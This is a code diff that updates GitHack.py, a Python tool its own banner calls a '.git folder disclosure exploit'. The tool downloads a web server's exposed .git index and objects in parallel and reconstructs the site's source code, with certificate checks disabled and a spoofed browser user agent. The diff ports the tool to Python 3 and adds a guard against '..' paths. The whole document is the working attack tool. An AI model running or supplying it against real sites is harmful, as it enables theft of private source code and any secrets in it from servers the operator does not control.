@@ -2,27 +2,35 @@
 # -*- encoding: utf-8 -*-
 
 import sys
-import urllib2
+try:
+    # python 2.x
+    import urllib2
+    import urlparse
+    import Queue
+except Exception as e:
+    # python 3.x
+    import urllib.request as urllib2
+    import urllib.parse as urlparse
+    import queue as Queue
+
 import os
-import urlparse
 import zlib
 import threading
-import Queue
 import re
 import time
 from lib.parser import parse
 import ssl
 
 context = ssl._create_unverified_context()
+user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) ' \
+             'Chrome/99.0.4844.82 Safari/537.36'
 if len(sys.argv) == 1:
     msg = """
 A `.git` folder disclosure exploit. By LiJieJie
 
-Usage: GitHack.py http://www.target.com/.git/
-
-bug-report: my[at]lijiejie.com (http://www.lijiejie.com)
+Usage: python GitHack.py http://www.target.com/.git/
 """
-    print msg
+    print(msg)
     sys.exit(0)
 
 
@@ -30,33 +38,38 @@ class Scanner(object):
     def __init__(self):
         self.base_url = sys.argv[-1]
         self.domain = urlparse.urlparse(sys.argv[-1]).netloc.replace(':', '_')
-        if not os.path.exists(self.domain):
-            os.mkdir(self.domain)
-        print '[+] Download and parse index file ...'
-        data = self._request_data(sys.argv[-1] + '/index')
+        print('[+] Download and parse index file ...')
+        try:
+            data = self._request_data(sys.argv[-1] + '/index')
+        except Exception as e:
+            print('[ERROR] index file download file: %s' % str(e))
+            exit(-1)
         with open('index', 'wb') as f:
             f.write(data)
+        if not os.path.exists(self.domain):
+            os.mkdir(self.domain)
         self.queue = Queue.Queue()
         for entry in parse('index'):
             if "sha1" in entry.keys():
-                self.queue.put((entry["sha1"].strip(), entry["name"].strip()))
+                if entry["name"].strip().find('..') < 0:
+                    self.queue.put((entry["sha1"].strip(), entry["name"].strip()))
                 try:
-                    print entry['name']
+                    print('[+] %s' % entry['name'])
                 except Exception as e:
                     pass
         self.lock = threading.Lock()
-        self.thread_count = 20
+        self.thread_count = 10
         self.STOP_ME = False
 
     @staticmethod
     def _request_data(url):
-        request = urllib2.Request(url, None, {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X)'})
+        request = urllib2.Request(url, None, {'User-Agent': user_agent})
         return urllib2.urlopen(request, context=context).read()
 
     def _print(self, msg):
         self.lock.acquire()
         try:
-            print msg
+            print(msg)
         except Exception as e:
             pass
         self.lock.release()
@@ -75,7 +88,11 @@ class Scanner(object):
                         data = zlib.decompress(data)
                     except:
                         self._print('[Error] Fail to decompress %s' % file_name)
-                    data = re.sub(r'blob \d+\00', '', data)
+                    # data = re.sub(r'blob \d+\00', '', data)
+                    try:
+                        data = re.sub(r'blob \d+\00', '', data)
+                    except Exception as e:
+                        data = re.sub(b"blob \\d+\00", b'', data)
                     target_dir = os.path.join(self.domain, os.path.dirname(file_name))
                     if target_dir and not os.path.exists(target_dir):
                         os.makedirs(target_dir)
@@ -83,7 +100,7 @@ class Scanner(object):
                         f.write(data)
                     self._print('[OK] %s' % file_name)
                     break
-                except urllib2.HTTPError, e:
+                except urllib2.HTTPError as e:
                     if str(e).find('HTTP Error 404') >= 0:
                         self._print('[File not found] %s' % file_name)
                         break
@@ -108,7 +125,7 @@ if __name__ == '__main__':
     try:
         while s.thread_count > 0:
             time.sleep(0.1)
-    except KeyboardInterrupt, e:
+    except KeyboardInterrupt as e:
         s.STOP_ME = True
         time.sleep(1.0)
-        print 'User Aborted.'
+        print('User Aborted.')
